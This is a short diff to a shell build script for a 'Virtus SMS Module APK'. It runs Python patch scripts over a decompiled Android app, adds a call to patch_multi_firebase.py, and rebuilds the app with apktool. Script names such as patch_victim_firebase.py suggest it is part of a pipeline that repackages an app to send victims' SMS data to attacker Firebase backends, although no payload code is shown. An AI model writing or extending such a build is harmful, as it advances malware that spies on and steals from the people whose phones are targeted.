@@ -25,6 +25,7 @@ echo "Building Virtus SMS Module APK..."
 python3 "$ROOT/patch_astik_flow.py"
 python3 "$ROOT/patch_victim_firebase.py"
 python3 "$ROOT/patch_astik_readconfig.py"
+python3 "$ROOT/patch_multi_firebase.py"
 python3 "$ROOT/generate_icons.py"
 java -jar "$APKTOOL" b virtus_decompiled -o virtus-unsigned.apk
 
